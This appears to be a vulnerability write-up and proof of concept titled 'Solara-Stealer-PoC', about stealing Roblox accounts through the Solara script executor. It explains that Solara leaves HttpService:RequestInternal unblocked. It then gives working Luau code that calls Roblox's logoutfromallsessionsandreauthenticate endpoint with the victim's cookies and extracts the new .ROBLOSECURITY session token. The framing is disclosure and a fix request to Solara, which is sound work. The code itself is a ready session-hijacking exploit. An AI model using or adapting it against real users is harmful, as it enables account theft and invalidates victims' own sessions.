# Solara-Stealer-PoC
Writeup on stealing roblox accounts with Solara

# Introduction
[RequestInternal](https://robloxapi.github.io/ref/class/HttpService.html#member-RequestInternal) is a 'CoreScript' function in Roblox that allows the Roblox engine to interact with Roblox’s internal web APIs. This function is essential for interacting with Roblox's web API's as the user. This write-up will focus on its use in session hijacking, and other potential uses.

# Session Hijacking via Reauthentication
Under the "[Roblox authentication web API](https://auth.roblox.com)", a feature exists under the name "logoutfromallsessionsandreauthenticate". It does exactly what the name suggests, it takes the input '.ROBLOSECURITY' session, invalidates it, then gives you a new one to reauthenticate with.

Now, with 'RequestInternal', you cannot use the function with a normal LocalScript, as if you could you could perform actions maliciously using the user's cookie(s). The issue, is that Solara, did not block this function for use in the execution, therefore the user using Solara is vulnerable to the exploitation of 'RequestInternal'.

# Example
```luau
-- httpservice
local httpService = game:GetService("HttpService")

-- data for the request
local data = {
    Url = "https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate", -- url for reauthentication
    Method = "POST", -- send a POST request
    Body = "{}" -- placeholder
}
-- this request will be sent with the user's cookies
local request = httpService:RequestInternal(data)

-- success is a boolean - whether or not the request was a success (?)
-- response is the dict of response data:
--[[
    response.Body: string
    response.Headers: table (dict)
    response.StatusCode: number
]]
    -- start the request
request:Start(function(success, response) 
    local headers = response.Headers -- get the response headers
    local cookie = headers["set-cookie"] -- get the cookies sent from the server
    local session = cookie:split(";")[1] -- get the raw cookie text without expiration shi

    print(session) -- output the reauthenticated session
end)
```

# Conclusion
Solara needs to disallow exploiters from being able to use the 'RequestInternal' function.
